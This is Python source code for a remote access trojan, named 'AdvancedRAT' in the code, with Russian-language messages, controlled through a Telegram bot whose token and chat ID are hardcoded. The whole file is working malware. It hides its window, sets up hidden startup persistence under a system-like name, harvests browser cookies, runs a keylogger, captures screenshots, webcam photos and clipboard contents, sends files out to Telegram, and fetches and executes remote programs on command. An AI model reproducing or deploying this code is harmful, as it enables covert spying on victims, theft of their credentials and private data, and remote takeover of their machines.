import os
import platform
import requests
import subprocess
import time
import shutil
import socket
import sys
import json
import threading
import tempfile
from pathlib import Path

try:
    from PIL import ImageGrab
    import cv2
    import pynput.keyboard
    import psutil
    import win32crypt
    import browser_cookie3
except ImportError:
    if platform.system().startswith("Windows"):
        os.system("python -m pip install pillow opencv-python pynput psutil pywin32 browser-cookie3 -q -q -q")
        from PIL import ImageGrab
        import pynput.keyboard
        import psutil

BOT_TOKEN = "8317387634:AAHexPFi5rjtIZMDztq2oOnPp9z8Chl4sn0"
CHAT_ID = "-1003442349627"

class AdvancedRAT:
    def __init__(self):
        self.bot_token = BOT_TOKEN
        self.chat_id = CHAT_ID
        self.victim_id = socket.gethostname()
        self.last_update_id = 0
        self.keylogger = None
        self.is_keylogging = False
        
    def hide_console(self):
        try:
            if platform.system().startswith("Windows"):
                import win32gui
                import win32con
                window = win32gui.GetForegroundWindow()
                win32gui.ShowWindow(window, win32con.SW_HIDE)
        except:
            pass

    def setup_persistence(self):
        try:
            if platform.system().startswith("Windows"):
                appdata = os.getenv('APPDATA')
                startup_dir = os.path.join(appdata, 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
                
                script_path = os.path.abspath(__file__)
                target_path = os.path.join(startup_dir, 'windows_system_service.py')
                
                if not os.path.exists(target_path):
                    shutil.copy2(script_path, target_path)
                    subprocess.run(f'attrib +h +s "{target_path}"', shell=True, capture_output=True)
                    
        except:
            pass

    def send_to_telegram(self, text):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            params = {'chat_id': self.chat_id, 'text': text}
            requests.get(url, params=params, timeout=10)
        except:
            pass

    def send_file_to_telegram(self, filename):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
            with open(filename, 'rb') as file:
                files = {'document': file}
                data = {'chat_id': self.chat_id}
                requests.post(url, data=data, files=files, timeout=30)
        except:
            pass

    # 1. ФАЙЛОВАЯ СИСТЕМА
    def list_directory(self, path="."):
        try:
            files = []
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                files.append(f"{'📁' if os.path.isdir(item_path) else '📄'} {item}")
            return "\n".join(files[:50])  # Ограничиваем вывод
        except:
            return "❌ Ошибка доступа"

    def search_files(self, keyword, path="."):
        try:
            found_files = []
            for root, dirs, files in os.walk(path):
                for file in files:
                    if keyword.lower() in file.lower():
                        found_files.append(os.path.join(root, file))
                if len(found_files) > 20:  # Ограничиваем результаты
                    break
            return "\n".join(found_files) if found_files else "❌ Файлы не найдены"
        except:
            return "❌ Ошибка поиска"

    def download_file(self, file_path):
        try:
            if os.path.exists(file_path):
                self.send_file_to_telegram(file_path)
                return f"✅ Файл отправлен: {os.path.basename(file_path)}"
            return "❌ Файл не найден"
        except:
            return "❌ Ошибка отправки"

    def steal_browser_passwords(self):
        try:
            passwords = []
            browsers = ['chrome', 'edge', 'firefox', 'opera']
            
            for browser in browsers:
                try:
                    cookies = browser_cookie3.load(browser)
                    for cookie in cookies:
                        if 'password' in cookie.name.lower() or 'login' in cookie.name.lower():
                            passwords.append(f"{browser}: {cookie.name} = {cookie.value}")
                except:
                    pass
            
            return "\n".join(passwords) if passwords else "❌ Пароли не найдены"
        except:
            return "❌ Ошибка кражи паролей"

    # 2. УПРАВЛЕНИЕ СИСТЕМОЙ
    def get_processes(self):
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
                try:
                    processes.append(f"{proc.info['pid']} | {proc.info['name']} | {proc.info['memory_info'].rss // 1024 // 1024}MB")
                except:
                    pass
            return "\n".join(processes[:30])
        except:
            return "❌ Ошибка получения процессов"

    def kill_process(self, pid):
        try:
            os.kill(int(pid), 9)
            return f"✅ Процесс {pid} убит"
        except:
            return f"❌ Не удалось убить процесс {pid}"

    def get_system_info(self):
        try:
            ip = requests.get('https://ifconfig.me/ip', timeout=10).text.strip()
            
            info = f"""💻 ПОЛНАЯ ИНФОРМАЦИЯ О СИСТЕМЕ:

🖥️ Компьютер: {self.victim_id}
👤 Пользователь: {os.getlogin()}
🌐 IP адрес: {ip}
⚙️ ОС: {platform.system()} {platform.release()}
💾 Память: {psutil.virtual_memory().total // 1024 // 1024} MB
🖥️ Процессор: {platform.processor()}
📁 Директория: {os.getcwd()}"""
            
            return info
        except:
            return f"💻 Базовая информация:\nКомпьютер: {self.victim_id}\nПользователь: {os.getlogin()}"

    # 3. ШПИОНАЖ
    def start_keylogger(self):
        if self.is_keylogging:
            return "❌ Кейлоггер уже запущен"
        
        self.is_keylogging = True
        self.keylog_file = "keylog.txt"
        self.keys = []
        
        def on_press(key):
            try:
                self.keys.append(str(key).replace("'", ""))
                if len(self.keys) > 100:
                    with open(self.keylog_file, "a", encoding="utf-8") as f:
                        f.write("".join(self.keys) + "\n")
                    self.keys = []
            except:
                pass
        
        self.keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
        self.keyboard_listener.start()
        return "✅ Кейлоггер запущен"

    def stop_keylogger(self):
        if not self.is_keylogging:
            return "❌ Кейлоггер не запущен"
        
        self.is_keylogging = False
        if self.keyboard_listener:
            self.keyboard_listener.stop()
        
        # Сохраняем оставшиеся ключи
        if self.keys:
            with open(self.keylog_file, "a", encoding="utf-8") as f:
                f.write("".join(self.keys) + "\n")
        
        if os.path.exists(self.keylog_file):
            self.send_file_to_telegram(self.keylog_file)
            os.remove(self.keylog_file)
        
        return "✅ Кейлоггер остановлен и логи отправлены"

    def get_clipboard(self):
        try:
            if platform.system().startswith("Windows"):
                import win32clipboard
                win32clipboard.OpenClipboard()
                data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                return f"📋 Буфер обмена:\n{data}"
            return "❌ Не поддерживается на этой ОС"
        except:
            return "❌ Ошибка чтения буфера обмена"

    # 4. УСТРОЙСТВА ВВОДА/ВЫВОДА
    def take_screenshot(self):
        try:
            file_path = "screenshot.png"
            screenshot = ImageGrab.grab()
            screenshot.save(file_path)
            self.send_file_to_telegram(file_path)
            os.remove(file_path)
            return "📸 Скриншот отправлен!"
        except:
            return "❌ Ошибка создания скриншота"

    def webcam_capture(self):
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                file_path = "webcam.jpg"
                cv2.imwrite(file_path, frame)
                self.send_file_to_telegram(file_path)
                os.remove(file_path)
                cap.release()
                return "📹 Фото с вебкамеры отправлено!"
            cap.release()
            return "❌ Не удалось получить фото с вебкамеры"
        except:
            return "❌ Ошибка доступа к вебкамере"

    # 5. СЕТЕВЫЕ ФУНКЦИИ
    def network_scan(self):
        try:
            result = subprocess.check_output('arp -a', shell=True, stderr=subprocess.STDOUT)
            return f"🌐 Сканирование сети:\n{result.decode('utf-8', errors='ignore')[:2000]}"
        except:
            return "❌ Ошибка сканирования сети"

    def download_and_execute(self, url):
        try:
            response = requests.get(url, timeout=30)
            if response.status_code == 200:
                file_name = url.split('/')[-1] or "downloaded_file.exe"
                with open(file_name, 'wb') as f:
                    f.write(response.content)
                
                subprocess.Popen(file_name, shell=True)
                return f"✅ Файл скачан и запущен: {file_name}"
            return "❌ Ошибка загрузки файла"
        except:
            return "❌ Ошибка выполнения"

    # 6. УПРАВЛЕНИЕ
    def send_main_keyboard(self):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            keyboard = {
                'keyboard': [
                    [{'text': '📸 Скриншот'}, {'text': '📹 Вебкамера'}],
                    [{'text': '💻 Информация'}, {'text': '📊 Процессы'}],
                    [{'text': '📁 Файлы'}, {'text': '🔍 Поиск файлов'}],
                    [{'text': '⌨️ Кейлоггер'}, {'text': '📋 Буфер обмена'}],
                    [{'text': '🌐 Сеть'}, {'text': '🔄 Перезагрузить'}],
                    [{'text': '🗑️ Удалить RAT'}]
                ],
                'resize_keyboard': True
            }
            params = {
                'chat_id': self.chat_id,
                'text': f'🎯 Расширенное управление: {self.victim_id}',
                'reply_markup': keyboard
            }
            response = requests.post(url, json=params, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if 'result' in data:
                    self.last_update_id = data['result']['update_id']
        except:
            pass

    def execute_command(self, command):
        try:
            if command == '📸 Скриншот':
                return self.take_screenshot()
            elif command == '📹 Вебкамера':
                return self.webcam_capture()
            elif command == '💻 Информация':
                return self.get_system_info()
            elif command == '📊 Процессы':
                return self.get_processes()
            elif command == '📁 Файлы':
                return f"📁 Текущая директория:\n{self.list_directory()}"
            elif command == '🔍 Поиск файлов':
                return "📝 Используйте: search:ключевое_слово"
            elif command == '⌨️ Кейлоггер':
                return "⌨️ Команды:\nstart_keylogger - запуск\nstop_keylogger - остановка"
            elif command == '📋 Буфер обмена':
                return self.get_clipboard()
            elif command == '🌐 Сеть':
                return self.network_scan()
            elif command == '🔄 Перезагрузить':
                if platform.system().startswith("Windows"):
                    os.system('shutdown /r /t 10')
                    return "🔄 Перезагрузка через 10 секунд!"
                else:
                    os.system('shutdown -r +1')
                    return "🔄 Перезагрузка через 1 минуту!"
            elif command == '🗑️ Удалить RAT':
                if self.uninstall_rat():
                    return "🗑️ RAT удалена!"
                else:
                    return "❌ Ошибка удаления"
            else:
                return "❌ Неизвестная команда"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"

    def uninstall_rat(self):
        try:
            if platform.system().startswith("Windows"):
                startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
                rat_path = os.path.join(startup_dir, 'windows_system_service.py')
                if os.path.exists(rat_path):
                    os.remove(rat_path)
            return True
        except:
            return False

    def check_commands(self):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/getUpdates"
            params = {'offset': self.last_update_id + 1, 'timeout': 10}
            response = requests.get(url, params=params, timeout=15)
            
            if response.status_code == 200:
                data = response.json()
                if 'result' in data:
                    for update in data['result']:
                        update_id = update['update_id']
                        
                        if update_id > self.last_update_id:
                            self.last_update_id = update_id
                        
                        if 'message' in update and 'text' in update['message']:
                            message_text = update['message']['text']
                            
                            # Обработка специальных команд
                            if message_text.startswith('search:'):
                                keyword = message_text[7:]
                                result = self.search_files(keyword)
                                self.send_to_telegram(f"🔍 Результаты поиска '{keyword}':\n{result}")
                                continue
                            elif message_text == 'start_keylogger':
                                result = self.start_keylogger()
                                self.send_to_telegram(result)
                                continue
                            elif message_text == 'stop_keylogger':
                                result = self.stop_keylogger()
                                self.send_to_telegram(result)
                                continue
                            elif message_text.startswith('download:'):
                                file_path = message_text[9:]
                                result = self.download_file(file_path)
                                self.send_to_telegram(result)
                                continue
                            elif message_text.startswith('kill:'):
                                pid = message_text[5:]
                                result = self.kill_process(pid)
                                self.send_to_telegram(result)
                                continue
                            elif message_text.startswith('exec:'):
                                url = message_text[5:]
                                result = self.download_and_execute(url)
                                self.send_to_telegram(result)
                                continue
                            
                            # Основные команды с кнопок
                            if message_text in ['📸 Скриншот', '📹 Вебкамера', '💻 Информация', '📊 Процессы',
                                              '📁 Файлы', '🔍 Поиск файлов', '⌨️ Кейлоггер', '📋 Буфер обмена',
                                              '🌐 Сеть', '🔄 Перезагрузить', '🗑️ Удалить RAT']:
                                result = self.execute_command(message_text)
                                self.send_to_telegram(f"💻 {self.victim_id}:\n{result}")
                                
                                if message_text == '🗑️ Удалить RAT':
                                    time.sleep(2)
                                    sys.exit(0)
                            
        except Exception as e:
            pass

    def start(self):
        self.hide_console()
        self.setup_persistence()
        
        # Отправляем уведомление
        system_info = self.get_system_info()
        self.send_to_telegram(system_info)
        
        # Отправляем расширенную клавиатуру
        time.sleep(2)
        self.send_main_keyboard()
        
        # Основной цикл
        while True:
            try:
                self.check_commands()
                time.sleep(3)
            except:
                time.sleep(10)

if __name__ == '__main__':
    rat = AdvancedRAT()
    rat.start()
